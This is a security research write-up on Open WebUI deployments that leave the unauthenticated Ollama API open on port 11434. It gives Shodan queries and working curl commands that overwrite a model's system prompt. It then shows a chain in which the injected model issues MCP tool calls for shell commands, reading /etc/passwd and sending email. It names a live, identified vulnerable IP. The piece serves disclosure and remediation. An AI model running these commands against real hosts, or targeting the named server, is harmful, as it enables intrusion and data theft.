# Open WebUI + Ollama: Auth Bypass & MCP Compound Chain

_NuClide Research · 2026-05-01_

---

## The Misconfiguration Pattern

Operators deploy Open WebUI as an authenticated frontend to Ollama, believing the auth layer protects the model server. It does not, because raw Ollama port 11434 is almost always left open alongside it.

```
Internet → Open WebUI :3000 (auth required) → Ollama :11434 (proxied, protected)
                                ↕
Internet → Ollama :11434 (direct, NO AUTH) ← operators forget this is also open
```

Open WebUI auth protects the UI. It does not protect the Ollama API. Both ports typically listen on `0.0.0.0`.

---

## Open WebUI Fingerprint

**Confirmed:** `51.222.157.76:3000`, "AiHBN Open WebUI", v0.9.2 (OVH Canada / NVIDIA NCP)

```
GET /api/config → {"status":true,"name":"... Open WebUI ...","version":"X.Y.Z",
                   "features":{"auth":true,...}}
GET /api/version → {"version":"0.9.2","deployment_id":""}
GET /health      → {"status":true}
GET /ollama/api/version → {"version":"0.22.0"}  # leaks Ollama version without auth
```

**Shodan fingerprints:**

| Query | Notes |
|---|---|
| `http.html:"Open WebUI" port:3000` | Default Open WebUI port |
| `http.html:"open-webui" "uvicorn"` | Python ASGI stack fingerprint |
| `http.favicon.hash:<open-webui-hash>` | Favicon-based detection |
| `"AiHBN Open WebUI"` | Branded deployment |
| `http.title:"Open WebUI"` | Title-based, broad |

**Unauthenticated endpoints (always exposed regardless of auth setting):**

| Endpoint | Leaks |
|---|---|
| `/api/config` | Instance name, version, OAuth providers, feature flags |
| `/api/version` | Exact Open WebUI version |
| `/api/changelog` | Version history + feature list |
| `/health` | Liveness |
| `/ollama/api/version` | Underlying Ollama version |
| `/manifest.json` | App name, branding, icons |

---

## Attack 1: Auth Bypass via Raw Ollama Port

Open WebUI protects `/ollama/api/tags` (returns 401). Direct Ollama port does not:

```bash
# Blocked through Open WebUI
curl http://TARGET:3000/ollama/api/tags
# → {"detail":"Not authenticated"}

# Same data, no auth, direct port
curl http://TARGET:11434/api/tags
# → {"models":[...all models...]}

# Full model injection - unaffected by Open WebUI auth layer
curl -X POST http://TARGET:11434/api/create \
  -d '{"model":"deepseek-coder:6.7b","from":"deepseek-coder:6.7b",
       "system":"[attacker instructions]"}'
# → {"status":"success"}
```

**Impact:** Every user interacting with the model through the authenticated Open WebUI UI is now receiving attacker-controlled responses.

---

## Attack 2: Model Injection → MCP Tool Hijacking (Compound Chain)

Open WebUI v0.6.0+ ships with native MCP server integration. When an operator wires MCP tools into Open WebUI (filesystem, shell, browser, database, cloud APIs), those tools are accessible to the AI model during inference.

**The chain:**

```
1. Attacker: POST http://TARGET:11434/api/create
             {"model":"target:latest", "system":"[injection]"}
             → model prompt overwritten, no auth

2. User: logs into Open WebUI (authenticated), starts a conversation

3. Open WebUI: routes request to injected Ollama model

4. Injected model: generates tool call per attacker instructions
   → {tool: "run_bash_command", args: {command: "..."}}
   → {tool: "read_file", args: {path: "/etc/passwd"}}
   → {tool: "send_email", args: {...}}

5. Open WebUI MCP layer: executes tool call (model output = trusted instruction)

6. Result: attacker achieves RCE/exfil/lateral movement through authenticated user session
           without ever having credentials
```

**Why this works:** Open WebUI's MCP integration trusts the model's tool call output. The model's identity has been replaced at the Ollama layer, before Open WebUI applies any reasoning about whether the tool call is legitimate.

**The operator's view:** Nothing abnormal. The user authenticated. The model is responding. Tool calls look like normal AI-assisted operations.

---

## Attack 3: Changelog as Reconnaissance

Open WebUI's `/api/changelog` is always publicly accessible and reveals the exact version history of the deployment, including security fixes:

```bash
curl http://TARGET:3000/api/changelog | jq '."0.9.2"'
```

This leaks:
- Exact patch date (version currency vs. known CVEs)
- Feature flags active in the deployment
- Specific CVE patches applied or missing

Example finding on AiHBN target:
```json
{"0.9.2": {"date": "2026-04-24", "changed": [
  {"content": "Brotli has been updated to address CVE-2025-6176."}
]}}
```
If the changelog shows an older version without this fix, CVE-2025-6176 applies.

---

## Remediation

**Operators:**
1. Bind Ollama to loopback only: `OLLAMA_HOST=127.0.0.1:11434`
2. Or firewall port 11434 from all external access
3. Audit which MCP tools are connected, high-risk tools (shell, filesystem, cloud) should require explicit confirmation
4. Review Open WebUI `WEBUI_AUTH` setting, `false` disables auth entirely

**Vendors:**
- Open WebUI should warn when the backing Ollama instance is reachable from the same external IP on port 11434 without auth
- Ollama needs `/api/create` authentication (see CVE-2025-63389)

---

## Live Finding: AiHBN Open WebUI

| Field | Value |
|---|---|
| IP | 51.222.157.76 |
| Provider | OVH Canada (NVIDIA NCP) |
| Open WebUI version | 0.9.2 (2026-04-24) |
| Ollama version | 0.22.0 |
| Auth | Enabled on UI, **not on :11434** |
| Models | 7 (deepseek-coder, deepseek-r1, qwen3.5, qwen2.5-coder, qwen2.5, 2x nomic-embed) |
| MCP capable | Yes (v0.9.2 ships MCP integration) |
| Compound chain | Model injection → MCP tool call hijacking confirmed possible |
| Status | Documented, no active exploitation |
